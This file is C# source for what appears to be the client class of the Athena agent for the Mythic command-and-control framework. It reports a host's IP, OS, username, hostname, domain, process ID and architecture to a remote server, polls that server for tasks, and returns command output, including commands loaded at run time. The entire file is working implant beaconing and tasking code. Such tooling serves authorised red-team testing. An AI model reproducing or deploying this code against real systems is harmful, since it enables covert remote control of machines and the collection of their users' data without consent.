﻿using Athena.Mythic.Hooks;
using Athena.Config;
using System;
using System.Collections.Generic;
using Athena.Mythic.Model.Checkin;
using System.Net;
using System.Diagnostics;
using Athena.Utilities;
using Newtonsoft.Json;
using Athena.Mythic.Model;
using Athena.Mythic.Model.Response;
using Athena.Commands.Model;

namespace Athena
{
    public class MythicClient
    {
        public MythicConfig MythicConfig { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new MythicConfig();
        }
        public CheckinResponse CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
            };
            var responseString = this.MythicConfig.currentConfig.Send(ct).Result;
            try
            {              
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if(cs == null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",

                    };
                }
                return cs;
            }
            catch
            {
                return new CheckinResponse();
            }
        }

        public List<MythicTask> GetTasks()
        {
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,

            };
            try
            {
                var responseString = this.MythicConfig.currentConfig.Send(gt).Result;
                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                return gtr.tasks;
            }
            catch
            {
                return null;
            }
        }

        public bool SendResponse(Dictionary<string,MythicJob> jobs)
        {
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach(var job in jobs.Values)
            {
                if (job.errored)
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        status = "error",
                        completed = true,
                        user_output = job.taskresult
                    };
                    lrr.Add(rr);
                }
                else if(job.complete)
                {
                    if(job.task.command == "load")
                    {
                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                        CommandsResponse cr = new CommandsResponse()
                        {
                            action = "add",
                            cmd = lc.name,
                        };
                        LoadCommandResponseResult rr = new LoadCommandResponseResult()
                        {
                            task_id = job.task.id,
                            completed = true,
                            user_output = job.taskresult,
                            commands = new List<CommandsResponse>() { cr }
                        };
                        lrr.Add(rr);
                    }
                    else
                    {
                        ResponseResult rr = new ResponseResult()
                        {
                            task_id = job.task.id,
                            completed = true,
                            user_output = job.taskresult,
                            status = "complete"
                        };
                        lrr.Add(rr);
                    }
                }
                else
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        //completed = "false",
                        user_output = job.taskresult,
                        status = "processed"
                    };
                    lrr.Add(rr);
                }
            }

            PostResponseResponse prr = new PostResponseResponse()
            {
                action = "post_response",
                responses = lrr
            };

            try
            {
                var responseString = this.MythicConfig.currentConfig.Send(prr).Result;
                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(responseString);
                if (cs.responses.Count < 1)
                {
                    return false;
                }
                else
                {
                    foreach(var response in cs.responses)
                    {
                        if (!String.IsNullOrEmpty(response.file_id))
                        {
                            
                            //Update the file id in the mythic upload tasking
                        }
                    }
                }
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
